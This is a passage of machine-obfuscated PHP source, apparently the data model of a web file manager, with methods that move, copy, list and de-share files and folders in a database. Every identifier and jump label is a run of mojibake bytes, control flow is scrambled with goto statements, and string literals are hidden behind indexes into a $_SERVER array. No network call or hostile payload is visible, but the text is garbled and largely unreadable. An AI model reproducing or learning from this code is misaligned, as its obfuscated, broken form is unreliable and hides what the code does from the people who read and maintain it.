$this->_childrenListCache[$bŠ¥³ˆÁ][$EîÔÆœ‚öå] = $Fœ†¼œÓÕƒ; $this->_childrenItemCache[$EîÔÆœ‚öå] = $Fœ†¼œÓÕƒ; } goto dõÑÜ×; EçËå„´³: $bÈÇåš¿¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e±Ôùê”‹‚ = $this->sourceInfo($EîÔÆœ‚öå); $e—á¬Ù…¸Í = $bÈÇåš¿¶[543]; goto Aâ—œÚ™Ö¡; Aâ—œÚ™Ö¡: $Eù©†ÊÖº = array($bÈÇåš¿¶[472] => array($bÈÇåš¿¶[496], $e±Ôùê”‹‚[$bÈÇåš¿¶[472]] . $EîÔÆœ‚öå . $bÈÇåš¿¶[497]), $bÈÇåš¿¶[408] => $this->targetIsDelete); $FÌï’Şñ = $this->field($e—á¬Ù…¸Í)->where($Eù©†ÊÖº)->select(); if (!$FÌï’Şñ) { return; } goto FÉò÷ÄŒÖ; dõÑÜ×: } private function _childrenListAll($BãƒïŒ—Ë‹, &$f£ØÁÅ¡²©) { $f‹È³È±·‘ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!isset($this->_childrenListCache[$BãƒïŒ—Ë‹])) { return; } $dÑ ¹‰Í¢¢ = $this->_childrenListCache[$BãƒïŒ—Ë‹]; foreach ($dÑ ¹‰Í¢¢ as $dà ÑÙé¾Ï => $BÅùŠ”Úèî) { $f£ØÁÅ¡²©[$dà ÑÙé¾Ï] = $BÅùŠ”Úèî; if ($BÅùŠ”Úèî[$f‹È³È±·‘[381]] == $f‹È³È±·‘[95]) { $this->_childrenListAll($dà ÑÙé¾Ï, $f£ØÁÅ¡²©); } } } private function sourceInfoCache($eõï”ÒëÁ) { if (isset($this->_childrenItemCache[$eõï”ÒëÁ])) { return $this->_childrenItemCache[$eõï”ÒëÁ]; } return $this->sourceInfo($eõï”ÒëÁ); } private function _childrenList($fî•ÔĞ½§) { if (isset($this->_childrenListCache[$fî•ÔĞ½§])) { return $this->_childrenListCache[$fî•ÔĞ½§]; } return $this->_childrenListSelect($fî•ÔĞ½§); } private function _childrenListSelect($cŠäœ™ò×) { goto DÀâáãÂ; e­˜Á“›ö‰: foreach ($E·æ¿ÆŒ˜ˆ as $cŠäœ™ò× => $c¹¾„‚Ó…Î) { $this->_childrenItemCache[$cŠäœ™ò×] = $c¹¾„‚Ó…Î; } return $E·æ¿ÆŒ˜ˆ; goto dˆš–‘šà; e· ÖÂ¥–: $fè¥ÛğÖ³ = $fè¥ÛğÖ³ ? $fè¥ÛğÖ³ : array(); $E·æ¿ÆŒ˜ˆ = array_to_keyvalue($fè¥ÛğÖ³, $Cé…Ä•·èø[380]); $this->_childrenListCache[$cŠäœ™ò×] = $E·æ¿ÆŒ˜ˆ; goto e­˜Á“›ö‰; DÀâáãÂ: $Cé…Ä•·èø =& $_SERVER[¹÷ˆ§éÒ°ú]; $aé‰‡ï›ÃŠ = array($Cé…Ä•·èø[474] => $cŠäœ™ò×, $Cé…Ä•·èø[408] => $this->targetIsDelete); $fè¥ÛğÖ³ = $this->where($aé‰‡ï›ÃŠ)->select(); goto e· ÖÂ¥–; dˆš–‘šà: } private function fileNameExistCache($F“î½«¦Îª, $CŒ™Ï¥ñ¹à) { $aô±˜£é“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CŒ™Ï¥ñ¹à = strtolower($CŒ™Ï¥ñ¹à); $fĞ‘èÓ“¬ˆ = $this->_childrenList($F“î½«¦Îª); foreach ($fĞ‘èÓ“¬ˆ as $b‹ìÍ¼‰áØ) { if ($CŒ™Ï¥ñ¹à == strtolower($b‹ìÍ¼‰áØ[$aô±˜£é“[38]])) { return $b‹ìÍ¼‰áØ[$aô±˜£é“[380]]; } } return !1; } private function fileNameAutoCache($cÊ®Ü¼¥’Ã, $a˜»ùÊò¤›, $e™‹¼““ß‘, $dÜ“òĞ…Ê) { $dö¸”ÌÉø¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $e›¢«öŸÒ¬ = $this->_childrenList($cÊ®Ü¼¥’Ã); $E£äÔÅÔ¼ø = array_to_keyvalue($e›¢«öŸÒ¬, $dö¸”ÌÉø¶[43], $dö¸”ÌÉø¶[38]); return $this->fileNameAutoGet($E£äÔÅÔ¼ø, $a˜»ùÊò¤›, $e™‹¼““ß‘, $dÜ“òĞ…Ê); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($cç¼ç ¸ß´, $bÛš’ÊÚå, $DÎÀï—Ö²ô = REPEAT_REPLACE, $eƒšÌ…õ• = '') { goto AŞ–÷ï¾Ûñ; BøµÉº–„×: $this->lockWriteStart($bÛš’ÊÚå, $dÑ«±Ì“°ô); $eêôˆ†Ç = array($aÇ”ÛËÌŞ[514] => array(), $aÇ”ÛËÌŞ[546] => !1); $this->clearShare($cç¼ç ¸ß´, $bÛš’ÊÚå); goto a³”îŠ²ìÖ; a±‡æ“é¤²: return $C«ä’ÉÂ; goto dÛğéÎŸ×é; dŞƒ”ÑÑÑÌ: if (!$aäÀĞÈù½‘ || !$dµ×ÚÛ¯ÈÕ || $dµ×ÚÛ¯ÈÕ[$aÇ”ÛËÌŞ[381]] != $aÇ”ÛËÌŞ[95]) { return !1; } Hook::trigger($aÇ”ÛËÌŞ[544], $F°˜ìòÖ¥); $this->targetIsDelete = intval($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[408]]); goto A³ÎŞÍ›Ä·; C©ù—¶®’Ÿ: $this->updateModifyTime($Cí¿öÄÜ¯»); Model($aÇ”ÛËÌŞ[518])->eventMove($cç¼ç ¸ß´, $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[474]], $bÛš’ÊÚå); Hook::trigger($aÇ”ÛËÌŞ[545], $F°˜ìòÖ¥); goto a±‡æ“é¤²; b•ê¹‰õ»§: $this->lockMoveEnd($cç¼ç ¸ß´); $this->lockWriteEnd($bÛš’ÊÚå, $dÑ«±Ì“°ô); $this->folderSizeReset($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[474]]); goto EÍº¸ùàö‡; EÍº¸ùàö‡: $this->folderSizeReset($bÛš’ÊÚå); $Cí¿öÄÜ¯» = array($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[474]], $bÛš’ÊÚå); if ($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[381]] == $aÇ”ÛËÌŞ[95]) { $Cí¿öÄÜ¯»[] = $cç¼ç ¸ß´; } goto C©ù—¶®’Ÿ; a³”îŠ²ìÖ: $F¯ÅÏõ‚Ò• = $this->fileNameExistCache($bÛš’ÊÚå, $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[38]]); $C«ä’ÉÂ = $this->_move($cç¼ç ¸ß´, $bÛš’ÊÚå, $DÎÀï—Ö²ô, $eêôˆ†Ç, $eƒšÌ…õ•); $this->sourceCacheClear(); goto aÔ®Ñ™Şß; A³ÎŞÍ›Ä·: if ($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[474]] == $bÛš’ÊÚå && $eƒšÌ…õ• != $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[38]]) { $e…Â—Ô×Ó» = $this->fileNameExist($bÛš’ÊÚå, $eƒšÌ…õ•); if ($e…Â—Ô×Ó» && $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[381]] == $aÇ”ÛËÌŞ[481]) { goto DÉõœÒƒ; DÉõœÒƒ: $fçò“‚ìÀ© = $this->sourceInfo($e…Â—Ô×Ó»); $AÂª¶İàå‚ = $this->fileHistory($fçò“‚ìÀ©, $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[430]], $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[89]]); if (!$AÂª¶İàå‚) { Model($aÇ”ÛËÌŞ[433])->remove($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[430]]); } goto AïˆÀ³ÖÉÊ; AïˆÀ³ÖÉÊ: $this->removeNow($cç¼ç ¸ß´, !1); $this->folderSizeReset($bÛš’ÊÚå); Hook::trigger($aÇ”ÛËÌŞ[545], $F°˜ìòÖ¥); goto F¸ğ›¹Ã¶¨; F¸ğ›¹Ã¶¨: return $e…Â—Ô×Ó»; goto b¨„§”¼ğÊ; b¨„§”¼ğÊ: } } $dÑ«±Ì“°ô = $eƒšÌ…õ• ? $eƒšÌ…õ• : $aäÀĞÈù½‘[$aÇ”ÛËÌŞ[38]]; $this->lockMoveStart($cç¼ç ¸ß´); goto BøµÉº–„×; C®·¶ª˜Èœ: if ($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[474]] == $dµ×ÚÛ¯ÈÕ[$aÇ”ÛËÌŞ[380]]) { if ($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[408]] == $aÇ”ÛËÌŞ[95]) { Model($aÇ”ÛËÌŞ[406])->restore(array($cç¼ç ¸ß´)); } return $cç¼ç ¸ß´; } $F°˜ìòÖ¥ = $this->pathInfoMore($cç¼ç ¸ß´); if ($this->isParentOf($cç¼ç ¸ß´, $bÛš’ÊÚå)) { return !1; } goto dŞƒ”ÑÑÑÌ; aÔ®Ñ™Şß: if ($aäÀĞÈù½‘[$aÇ”ÛËÌŞ[381]] == $aÇ”ÛËÌŞ[95] && $F¯ÅÏõ‚Ò•) { $this->folderSizeResetChildren($C«ä’ÉÂ); } Model($aÇ”ÛËÌŞ[179])->linkAdd($eêôˆ†Ç[$aÇ”ÛËÌŞ[514]]); if ($F¯ÅÏõ‚Ò• && $eêôˆ†Ç[$aÇ”ÛËÌŞ[546]]) { $this->removeNow($cç¼ç ¸ß´, !1); } goto b•ê¹‰õ»§; AŞ–÷ï¾Ûñ: $aÇ”ÛËÌŞ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aäÀĞÈù½‘ = $this->sourceInfo($cç¼ç ¸ß´); $dµ×ÚÛ¯ÈÕ = $this->sourceInfo($bÛš’ÊÚå); goto C®·¶ª˜Èœ; dÛğéÎŸ×é: } private function _move($DÈù„ÃìÀĞ, $eõ¯ôÂ·¶¯, $AêÅƒâøº, &$eŞ«ã ½Ñ, $F‚•å²Ö‹õ = '') { goto f„Ô»öÔ‚‹; d§ÓÇ¡‰½½: return $BÚÌÉÖâ›§; goto B¦Ëƒí˜™; F ¬‡Ú±İ…: $AÇ×¹â×õ = $F‚•å²Ö‹õ ? $F‚•å²Ö‹õ : $A­‚µÓ ’¢[$d¼›¾Á…ÈÓ[38]]; $fÆã¡¾òÉ = $this->fileNameExistCache($eõ¯ôÂ·¶¯, $AÇ×¹â×õ); $this->lockMoveStart($DÈù„ÃìÀĞ); goto Fõ´† “¡é; f„Ô»öÔ‚‹: $d¼›¾Á…ÈÓ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A­‚µÓ ’¢ = $this->sourceInfo($DÈù„ÃìÀĞ); $dÈˆ¸ª¥‡ = $A­‚µÓ ’¢[$d¼›¾Á…ÈÓ[381]] == $d¼›¾Á…ÈÓ[95]; goto F ¬‡Ú±İ…; Fõ´† “¡é: $this->lockWriteStart($eõ¯ôÂ·¶¯, $AÇ×¹â×õ); if (!$fÆã¡¾òÉ) { return $this->_moveForce($DÈù„ÃìÀĞ, $eõ¯ôÂ·¶¯, $AÇ×¹â×õ); } $BÚÌÉÖâ›§ = $fÆã¡¾òÉ; goto Eà¥äÂãˆÔ; Eà¥äÂãˆÔ: $c±øÖÛÇßÔ = !1; if ($dÈˆ¸ª¥‡) { if ($AêÅƒâøº == REPEAT_RENAME_FOLDER) { $AÇ×¹â×õ = $this->fileNameAuto($eõ¯ôÂ·¶¯, $AÇ×¹â×õ, $AêÅƒâøº, $dÈˆ¸ª¥‡); $BÚÌÉÖâ›§ = $this->_moveForce($DÈù„ÃìÀĞ, $eõ¯ôÂ·¶¯, $AÇ×¹â×õ); } else { if ($AêÅƒâøº == REPEAT_RENAME_FOLDER) { $AêÅƒâøº = REPEAT_RENAME; } $C×ƒêÍ¥¿ = $this->_childrenListSelect($DÈù„ÃìÀĞ); foreach ($C×ƒêÍ¥¿ as $aáÊÓÕ äÛ) { $this->_move($aáÊÓÕ äÛ[$d¼›¾Á…ÈÓ[380]], $fÆã¡¾òÉ, $AêÅƒâøº, $eŞ«ã ½Ñ); } $c±øÖÛÇßÔ = !0; } } else { if ($AêÅƒâøº == REPEAT_SKIP) { $c±øÖÛÇßÔ = !0; } else { if ($AêÅƒâøº == REPEAT_RENAME || $AêÅƒâøº == REPEAT_RENAME_FOLDER) { $AÇ×¹â×õ = $this->fileNameAuto($eõ¯ôÂ·¶¯, $AÇ×¹â×õ, $AêÅƒâøº, $dÈˆ¸ª¥‡); $BÚÌÉÖâ›§ = $this->_moveForce($DÈù„ÃìÀĞ, $eõ¯ôÂ·¶¯, $AÇ×¹â×õ); } else { if ($AêÅƒâøº == REPEAT_REPLACE) { $bø†‘ŸäÚ = $this->sourceInfoCache($fÆã¡¾òÉ); $d”íÚêí¨ë = $this->fileHistory($bø†‘ŸäÚ, $A­‚µÓ ’¢[$d¼›¾Á…ÈÓ[430]], $A­‚µÓ ’¢[$d¼›¾Á…ÈÓ[89]]); if ($d”íÚêí¨ë) { $eŞ«ã ½Ñ[$d¼›¾Á…ÈÓ[514]][] = $A­‚µÓ ’¢[$d¼›¾Á…ÈÓ[430]]; } else { $c±øÖÛÇßÔ = !0; } } } } } if ($c±øÖÛÇßÔ && !$eŞ«ã ½Ñ[$d¼›¾Á…ÈÓ[546]]) { $eŞ«ã ½Ñ[$d¼›¾Á…ÈÓ[546]] = !0; } goto d§ÓÇ¡‰½½; B¦Ëƒí˜™: } private function _moveForce($F‘ÁĞæäáù, $cİÃê¼ÛŠõ, $c”àññÅ°Æ) { goto eÃæ õÔŞõ; fŠƒ²İôÜ: if (!$cÎÁô™«¤ì) { Model($C–’ŞÃ™Û[467])->authClear($F‘ÁĞæäáù); } $dˆï•“¡Í = $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[408]] == $C–’ŞÃ™Û[95] && $EÀñÓÁ±[$C–’ŞÃ™Û[408]] != $C–’ŞÃ™Û[95]; if ($dˆï•“¡Í) { $C¯“¼µš¿[$C–’ŞÃ™Û[407]] = 0; } goto BŞæ»Ø›ñ; BŞæ»Ø›ñ: if ($b‹æÏ•åìò) { $F¹‡°ÚÊà = array($C–’ŞÃ™Û[538] => array($C–’ŞÃ™Û[496], $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[472]] . $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[380]] . $C–’ŞÃ™Û[497])); $A¼²²›ù¸Š = $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[472]] . $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[380]] . $C–’ŞÃ™Û[57]; $f³ê·Å…ğ° = $EÀñÓÁ±[$C–’ŞÃ™Û[472]] . $EÀñÓÁ±[$C–’ŞÃ™Û[380]] . $C–’ŞÃ™Û[57] . $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[380]] . $C–’ŞÃ™Û[57]; $C¬Ï´¾ÉÒ´ = array($C–’ŞÃ™Û[538] => array($C–’ŞÃ™Û[547], "\x72\x65\160\154\x61\x63\145\50\x70\x61\162\145\x6e\164\x4c\145\166\x65\154\x2c\47{$A¼²²›ù¸Š}\x27\54\47{$f³ê·Å…ğ°}\x27\51"), $C–’ŞÃ™Û[534] => $EÀñÓÁ±[$C–’ŞÃ™Û[382]], $C–’ŞÃ™Û[535] => $EÀñÓÁ±[$C–’ŞÃ™Û[469]]); if ($dˆï•“¡Í) { $C¬Ï´¾ÉÒ´[$C–’ŞÃ™Û[407]] = 0; } $this->where($F¹‡°ÚÊà)->data($C¬Ï´¾ÉÒ´)->save(); } $this->where(array($C–’ŞÃ™Û[394] => $F‘ÁĞæäáù))->data($C¯“¼µš¿)->save(); return $F‘ÁĞæäáù; goto eÂÓ‘Ê‡Ïä; eÃæ õÔŞõ: $C–’ŞÃ™Û =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÀ¹Ï×ƒÊØ = $this->sourceInfo($F‘ÁĞæäáù); $EÀñÓÁ± = $this->sourceInfo($cİÃê¼ÛŠõ); goto D¤½Ç¦°¹Š; D¤½Ç¦°¹Š: $b‹æÏ•åìò = $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[381]] == $C–’ŞÃ™Û[95]; $C¯“¼µš¿ = array($C–’ŞÃ™Û[379] => $EÀñÓÁ±[$C–’ŞÃ™Û[380]], $C–’ŞÃ™Û[538] => $EÀñÓÁ±[$C–’ŞÃ™Û[472]] . $EÀñÓÁ±[$C–’ŞÃ™Û[380]] . $C–’ŞÃ™Û[57], $C–’ŞÃ™Û[534] => $EÀñÓÁ±[$C–’ŞÃ™Û[382]], $C–’ŞÃ™Û[535] => $EÀñÓÁ±[$C–’ŞÃ™Û[469]], $C–’ŞÃ™Û[537] => USER_ID, $C–’ŞÃ™Û[397] => $c”àññÅ°Æ); $cÎÁô™«¤ì = $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[382]] == SourceModel::TYPE_GROUP && $EÀñÓÁ±[$C–’ŞÃ™Û[382]] == SourceModel::TYPE_GROUP && $DÀ¹Ï×ƒÊØ[$C–’ŞÃ™Û[469]] == $EÀñÓÁ±[$C–’ŞÃ™Û[469]]; goto fŠƒ²İôÜ; eÂÓ‘Ê‡Ïä: } private function clearShare($fÓ×Ğˆ¹©, $DÊÆõŠ¹¥) { goto f„áÒøÏ½; AÆåÎ³…êŸ: if ($dÆ‹ø‚øËˆ[$fİ§”òã½¼[469]] == $cÂ™œ©±ËÖ[$fİ§”òã½¼[469]] && $dÆ‹ø‚øËˆ[$fİ§”òã½¼[382]] == $fİ§”òã½¼[548]) { return; } $B’â»‰«Òí = array($fİ§”òã½¼[472] => array($fİ§”òã½¼[496], $dÆ‹ø‚øËˆ[$fİ§”òã½¼[472]] . $fÓ×Ğˆ¹© . $fİ§”òã½¼[497])); $f¤½‚çÓ† = $this->field($fİ§”òã½¼[394])->where($B’â»‰«Òí)->getField($fİ§”òã½¼[380], !0); goto F¶¸Öã©İ·; F¶¸Öã©İ·: if (!$f¤½‚çÓ†) { return; } $B’â»‰«Òí = array($fİ§”òã½¼[380] => array($fİ§”òã½¼[17], $f¤½‚çÓ†), $fİ§”òã½¼[459] => 1); $AçÜÔ§ë…™ = Model($fİ§”òã½¼[549])->field($fİ§”òã½¼[452])->where($B’â»‰«Òí)->select(); goto eÀĞ—ÑèçÖ; eÀĞ—ÑèçÖ: if (!$AçÜÔ§ë…™) { return; } $AçÜÔ§ë…™ = array_to_keyvalue($AçÜÔ§ë…™, $fİ§”òã½¼[43], $fİ§”òã½¼[452]); $B’â»‰«Òí = array($fİ§”òã½¼[452] => array($fİ§”òã½¼[17], $AçÜÔ§ë…™)); goto c§¹Ÿ«Ÿ¡; c§¹Ÿ«Ÿ¡: Model($fİ§”òã½¼[549])->where($B’â»‰«Òí)->save(array($fİ§”òã½¼[459] => 0)); Model($fİ§”òã½¼[550])->where($B’â»‰«Òí)->delete(); goto añâÀ–Ãõô; f„áÒøÏ½: $fİ§”òã½¼ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÆ‹ø‚øËˆ = $this->sourceInfo($fÓ×Ğˆ¹©); $cÂ™œ©±ËÖ = $this->sourceInfo($DÊÆõŠ¹¥); goto AÆåÎ³…êŸ; añâÀ–Ãõô: } public function copyFolderFromIO($bİƒÍÂ©İà, $fó‡èò‚é, $A…½±èª¸ª, $E«Ü‰åÊŒî, $CìŠôÏ°¬á, $E“ñ±ƒ»Ù« = false) { goto AùìËµÌÔ; A¸ÃßÃŠÅæ: Model($f‰ôœòÂÌí[517])->addAll($D‰¨Ó´ªÔ[$f‰ôœòÂÌí[515]], array(), !0); Model($f‰ôœòÂÌí[518])->eventCopy($D™°¯œ÷Áº); $this->saveAll($D‰¨Ó´ªÔ[$f‰ôœòÂÌí[516]]); goto Bà‡îÙ‰‚Ğ; fùî—ë×†²: $aå™Š…¨Ó = $this->fileNameExist($A…½±èª¸ª, $a’áùŞ¢); $D™°¯œ÷Áº = $this->mkdir($A…½±èª¸ª, $a’áùŞ¢, $E«Ü‰åÊŒî); if (!$aå™Š…¨Ó || $E«Ü‰åÊŒî == REPEAT_RENAME_FOLDER) { $E«Ü‰åÊŒî = !1; } goto A¤Æ“ğé”; AùìËµÌÔ: $f‰ôœòÂÌí =& $_SERVER[¹÷ˆ§éÒ°ú]; $D‰¨Ó´ªÔ = array($f‰ôœòÂÌí[515] => array(), $f‰ôœòÂÌí[516] => array(), $f‰ôœòÂÌí[514] => array(), $f‰ôœòÂÌí[551] => array()); $a’áùŞ¢ = $E“ñ±ƒ»Ù« ? $E“ñ±ƒ»Ù« : $bİƒÍÂ©İà->getPathName($bİƒÍÂ©İà->pathThis($fó‡èò‚é)); goto fùî—ë×†²; eß¯Õ§ó…ß: $this->updateModifyTime($A…½±èª¸ª); return $D™°¯œ÷Áº; goto Aáº®ù¢Û±; Bà‡îÙ‰‚Ğ: Model($f‰ôœòÂÌí[433])->linkAdd($D‰¨Ó´ªÔ[$f‰ôœòÂÌí[514]]); Model($f‰ôœòÂÌí[433])->remove($D‰¨Ó´ªÔ[$f‰ôœòÂÌí[551]]); $this->folderSizeReset($A…½±èª¸ª); goto eß¯Õ§ó…ß; A¤Æ“ğé”: if ($aå™Š…¨Ó) { $this->_childrenAllMake($aå™Š…¨Ó); } Hook::trigger($f‰ôœòÂÌí[552]); $this->_copyChildTo($bİƒÍÂ©İà, $fó‡èò‚é, $D™°¯œ÷Áº, $E«Ü‰åÊŒî, $D‰¨Ó´ªÔ, $CìŠôÏ°¬á); goto Dòä¯‰Ò¢; Dòä¯‰Ò¢: Hook::trigger($f‰ôœòÂÌí[553]); if ($D™°¯œ÷Áº) { $this->folderSizeResetChildren($D™°¯œ÷Áº); } $this->_childrenListClear(); goto A¸ÃßÃŠÅæ; Aáº®ù¢Û±: } private function _copyChildTo($AÒœåƒˆ¦Ô, $eœ–Œ°ƒÛÎ, $bö˜„¬«ß, $AÑ¬ÃÙ½¾”, &$Bßšå‰¯„‡, $a¢ê‚®ëªÆ) { goto BŠÜ™Á†Ú; a‡ìâ–µº˜: $cŠÆ©à·ƒë = array_merge($c˜ÖÙ‰„ïó[$fİˆ°¨Šµ°[85]], $c˜ÖÙ‰„ïó[$fİˆ°¨Šµ°[86]]); $DôŒïµØÛŒ = $this->_addFiles($AÒœåƒˆ¦Ô, $c˜ÖÙ‰„ïó[$fİˆ°¨Šµ°[85]], $a¢ê‚®ëªÆ); $Aëï²Œ‰ = array(); goto D»çÙÜ¥; aÀæ‹°¹Û®: $fëïÆˆÕÚ¼ = $this->_childrenList($bö˜„¬«ß); $fëïÆˆÕÚ¼ = array_to_keyvalue($fëïÆˆÕÚ¼, $fİˆ°¨Šµ°[38]); foreach ($cŠÆ©à·ƒë as $bÄò¤º£ˆ) { $døìƒ¡ï¨– = $fëïÆˆÕÚ¼[$bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]]]; $fß²ó‘Ö•· = $døìƒ¡ï¨–[$fİˆ°¨Šµ°[380]]; $this->_copyApplyMeta($døìƒ¡ï¨–, $Bßšå‰¯„‡); if ($bÄò¤º£ˆ[$fİˆ°¨Šµ°[39]] == $fİˆ°¨Šµ°[88]) { $bÄò¤º£ˆ[$fİˆ°¨Šµ°[87]] = $AÒœåƒˆ¦Ô->getPathInner($bÄò¤º£ˆ[$fİˆ°¨Šµ°[87]]); $this->_copyChildTo($AÒœåƒˆ¦Ô, $bÄò¤º£ˆ[$fİˆ°¨Šµ°[87]], $fß²ó‘Ö•·, $AÑ¬ÃÙ½¾”, $Bßšå‰¯„‡, $a¢ê‚®ëªÆ); } } goto Fèí®‹ò; BŠÜ™Á†Ú: $fİˆ°¨Šµ° =& $_SERVER[¹÷ˆ§éÒ°ú]; $dß¥…àê‹ = $this->sourceInfoCache($bö˜„¬«ß); $c˜ÖÙ‰„ïó = $AÒœåƒˆ¦Ô->listPath($eœ–Œ°ƒÛÎ, !1, !0); goto a‡ìâ–µº˜; D»çÙÜ¥: foreach ($cŠÆ©à·ƒë as &$bÄò¤º£ˆ) { goto F‚ñ¦«Êö™; c¼µÙÔÈ: $bÄò¤º£ˆ[$fİˆ°¨Šµ°[89]] = _get($bÄò¤º£ˆ, $fİˆ°¨Šµ°[89], 0); $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]] = _get($bÄò¤º£ˆ, $fİˆ°¨Šµ°[430], 0); if (!isset($bÄò¤º£ˆ[$fİˆ°¨Šµ°[554]]) && $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]]) { $Bßšå‰¯„‡[$fİˆ°¨Šµ°[551]][] = $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]]; } goto bàÖ‹Í‹Œˆ; F‚ñ¦«Êö™: if (isset($DôŒïµØÛŒ[$bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]]])) { $bÄò¤º£ˆ = $DôŒïµØÛŒ[$bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]]]; } $bÄò¤º£ˆ[$fİˆ°¨Šµ°[381]] = $bÄò¤º£ˆ[$fİˆ°¨Šµ°[39]] == $fİˆ°¨Šµ°[88]; $bÄò¤º£ˆ[$fİˆ°¨Šµ°[383]] = _get($bÄò¤º£ˆ, $fİˆ°¨Šµ°[172], $fİˆ°¨Šµ°[43]); goto c¼µÙÔÈ; bàÖ‹Í‹Œˆ: if ($AÑ¬ÃÙ½¾”) { $a½ìÁÅŞëé = $this->fileNameExistCache($bö˜„¬«ß, $bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]]); if ($a½ìÁÅŞëé) { if ($bÄò¤º£ˆ[$fİˆ°¨Šµ°[381]] || $AÑ¬ÃÙ½¾” == REPEAT_SKIP) { continue; } if ($AÑ¬ÃÙ½¾” == REPEAT_REPLACE) { $døìƒ¡ï¨– = $this->sourceInfoCache($a½ìÁÅŞëé); $f“÷‡ŞÊÜ‰ = $this->fileHistory($døìƒ¡ï¨–, $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]], $bÄò¤º£ˆ[$fİˆ°¨Šµ°[89]]); if ($f“÷‡ŞÊÜ‰) { $Bßšå‰¯„‡[$fİˆ°¨Šµ°[514]][] = $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]]; } continue; } else { if ($AÑ¬ÃÙ½¾” == REPEAT_RENAME) { $bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]] = $this->fileNameAutoCache($bö˜„¬«ß, $bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]], $AÑ¬ÃÙ½¾”, !1); } } } } if (!$bÄò¤º£ˆ[$fİˆ°¨Šµ°[381]] && $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]]) { $Bßšå‰¯„‡[$fİˆ°¨Šµ°[514]][] = $bÄò¤º£ˆ[$fİˆ°¨Šµ°[430]]; } $Aëï²Œ‰[] = $this->_makeItemData($bÄò¤º£ˆ, $dß¥…àê‹, $bÄò¤º£ˆ[$fİˆ°¨Šµ°[38]]); goto F”é«Ô–Šé; F”é«Ô–Šé: } unset($bÄò¤º£ˆ); if (!empty($Aëï²Œ‰)) { $this->addAll($Aëï²Œ‰); } goto aÀæ‹°¹Û®; Fèí®‹ò: } private function _addFiles($BÉÓ¡ğ×Ïò, $Eã¡³èŠµí, $dî¿º…Œ‰©) { goto eÄëÇŞŞ§‰; B·Ü´¡×çµ: $dƒ¡êç¸š° = $F‰¥ƒ»Í±®->where($DËŠÊË…)->select(); $dƒ¡êç¸š° = $dƒ¡êç¸š° ? $dƒ¡êç¸š° : array(); foreach ($dƒ¡êç¸š° as $e¹ö¢ö®) { if (!isset($cšš¤Ãµ§‡[$e¹ö¢ö®[$eˆ ¡åìÂ[175]]])) { continue; } $aĞÚá¹—»­ = $cšš¤Ãµ§‡[$e¹ö¢ö®[$eˆ ¡åìÂ[175]]]; foreach ($aĞÚá¹—»­ as &$D¤·è”İÅÙ) { $D¤·è”İÅÙ[$eˆ ¡åìÂ[430]] = $e¹ö¢ö®[$eˆ ¡åìÂ[430]]; $D¤·è”İÅÙ[$eˆ ¡åìÂ[554]] = !0; } unset($D¤·è”İÅÙ); } goto A×êƒíæ‰; Aœ“”†çÌ’: $DËŠÊË… = array($eˆ ¡åìÂ[175] => array($eˆ ¡åìÂ[17], array_keys($cšš¤Ãµ§‡))); $dƒ¡êç¸š° = $F‰¥ƒ»Í±®->where($DËŠÊË…)->select(); $dƒ¡êç¸š° = $dƒ¡êç¸š° ? $dƒ¡êç¸š° : array(); goto b«©Ô‡—ã; A×êƒíæ‰: $eóÒ´·Š§õ = array(); foreach ($Eã¡³èŠµí as $aíÁïù‘š) { if (isset($aíÁïù‘š[$eˆ ¡åìÂ[554]]) && $aíÁïù‘š[$eˆ ¡åìÂ[554]]) { continue; } $dÜ½’Õ¬›µ = $BÉÓ¡ğ×Ïò->getPathInner($aíÁïù‘š[$eˆ ¡åìÂ[87]]); $d‰†©àéì¤ = $F‰¥ƒ»Í±®->addFileMake($dÜ½’Õ¬›µ, $aíÁïù‘š[$eˆ ¡åìÂ[89]], $aíÁïù‘š[$eˆ ¡åìÂ[176]], $aíÁïù‘š[$eˆ ¡åìÂ[175]], $aíÁïù‘š[$eˆ ¡åìÂ[38]], $dî¿º…Œ‰©); $eóÒ´·Š§õ[] = $d‰†©àéì¤; } $F‰¥ƒ»Í±®->addAll($eóÒ´·Š§õ); goto Aœ“”†çÌ’; eÄëÇŞŞ§‰: $eˆ ¡åìÂ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$Eã¡³èŠµí || count($Eã¡³èŠµí) == 0) { return array(); } 